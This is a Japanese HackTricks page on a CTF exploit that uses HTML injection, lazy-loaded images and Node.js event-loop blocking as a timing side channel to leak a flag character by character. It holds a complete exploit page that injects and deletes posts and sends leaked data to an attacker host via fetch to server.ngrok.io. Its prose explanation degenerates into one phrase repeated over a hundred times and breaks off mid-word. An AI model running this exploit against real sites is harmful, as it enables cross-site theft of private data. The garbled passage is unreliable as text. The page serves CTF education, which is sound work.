# イベントループのブロッキング + 遅延画像

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで企業を宣伝**したいですか？または、**PEASSの最新バージョンにアクセス**したいですか、または**HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つけます
* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に**参加**するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で**私をフォロー**する**🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングトリックを共有**するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。

</details>

[**このエクスプロイト**](https://gist.github.com/aszx87410/155f8110e667bae3d10a36862870ba45)では、[**@aszx87410**](https://twitter.com/aszx87410) が **遅延画像サイドチャネル** 技術を HTML インジェクションと組み合わせて、**イベントループブロッキング技術** を使用して文字をリークします。

これは、すでにコメントされている **CTFチャレンジ** に対する **別のエクスプロイト** です。詳細については、次のページを参照してください。

{% content-ref url="connection-pool-example.md" %}
[connection-pool-example.md](connection-pool-example.md)
{% endcontent-ref %}

このエクスプロイトのアイデアは次のとおりです：

* 投稿はアルファベット順に読み込まれます
* **攻撃者**は、**"A"** で始まる **投稿** を **インジェクト** することができます。その後、いくつかの **HTMLタグ**（大きな **`<canvas`** のような）が **画面のほとんどを埋め、最後に **`<img lazy`** タグがいくつか読み込まれます。
* **攻撃者が "A" の代わりに同じ投稿を "z" で始める**と、**フラグのついた投稿** が **最初に表示** され、その後 **インジェクトされた投稿** が "z" で始まり、**大きな** **キャンバス** が表示されます。フラグのついた投稿が最初に表示されたため、最初のキャンバスが画面全体を占有し、最後の **`<img lazy`** タグが画面に表示されず、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** ため、**読み込まれない** た
```html
<!DOCTYPE html>
<html>
<!--
The basic idea is to create a post with a lot of images which send request to "/" to block server-side nodejs event loop.
If images are loading, the request to "/" is slower, otherwise faster.
By using a well-crafted height, we can let note with "A" load image but note with "Z" not load.
We can use fetch to measure the request time.
-->
<body>
<button onclick="run()">start</button>

<!-- Inject post with payload -->
<form id=f action="http://localhost:1234/create" method="POST" target="_blank">
<input id=inp name="text" value="">
</form>

<!-- Remove index -->
<form id=f2 action="http://localhost:1234/remove" method="POST" target="_blank">
<input id=inp2 name="index" value="">
</form>

<script>
let flag = 'SEKAI{'
const TARGET = 'https://safelist.ctf.sekai.team'
f.action = TARGET + '/create'
f2.action = TARGET + '/remove'

const sleep = ms => new Promise(r => setTimeout(r, ms))
// Function to leak info to attacker
const send = data => fetch('http://server.ngrok.io?d='+data)
const charset = 'abcdefghijklmnopqrstuvwxyz'.split('')

// start exploit
let count = 0
setTimeout(async () => {
let L = 0
let R = charset.length - 1

// I have omited code here as apparently it wasn't necesary

// fallback to linerar since I am not familiar with binary search lol
for(let i=R; i>=L; i--) {
let c = charset[i]
send('try_' + flag + c)
const found = await testChar(flag + c)
if (found) {
send('found: '+ flag+c)
flag += c
break
}
}

}, 0)

async function testChar(str) {
return new Promise(resolve => {
/*
For 3350, you need to test it on your local to get this number.
The basic idea is, if your post starts with "Z", the image should not be loaded because it's under lazy loading threshold
If starts with "A", the image should be loaded because it's in the threshold.
*/
// <canvas height="3350px"> is experimental and allow to show the injected
// images when the post injected is the first one but to hide them when
// the injected post is after the post with the flag
inp.value = str + '<br><canvas height="3350px"></canvas><br>'+Array.from({length:20}).map((_,i)=>`<img loading=lazy src=/?${i}>`).join('')
f.submit()

setTimeout(() => {
run(str, resolve)
}, 500)
})
}

async function run(str, resolve) {
// Open posts page 5 times
for(let i=1; i<=5;i++) {
window.open(TARGET)
}

let t = 0
const round = 30 //Lets time 30 requests
setTimeout(async () => {
// Send 30 requests and time each
for(let i=0; i<round; i++) {
let s = performance.now()
await fetch(TARGET + '/?test', {
mode: 'no-cors'
}).catch(err=>1)
let end = performance.now()
t += end - s
console.log(end - s)
}
const avg = t/round
// Send info about how much time it took
send(str + "," + t + "," + "avg:" + avg)

/*
I get this threshold(1000ms) by trying multiple times on remote admin bot
for example, A takes 1500ms, Z takes 700ms, so I choose 1000 ms as a threshold
*/
const isFound = (t >= 1000)
if (isFound) {
inp2.value = "0"
} else {
inp2.value = "1"
}

// remember to delete the post to not break our leak oracle
f2.submit()
setTimeout(() => {
resolve(isFound)
}, 200)
}, 200)
}

</script>
</body>
</html>
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？**HackTricksで会社を宣伝**してみたいですか？または**最新版のPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。当社の独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクション
* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* **[💬](https://emojipedia.org/speech-balloon/) [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter**で**🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **ハッキングトリックを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
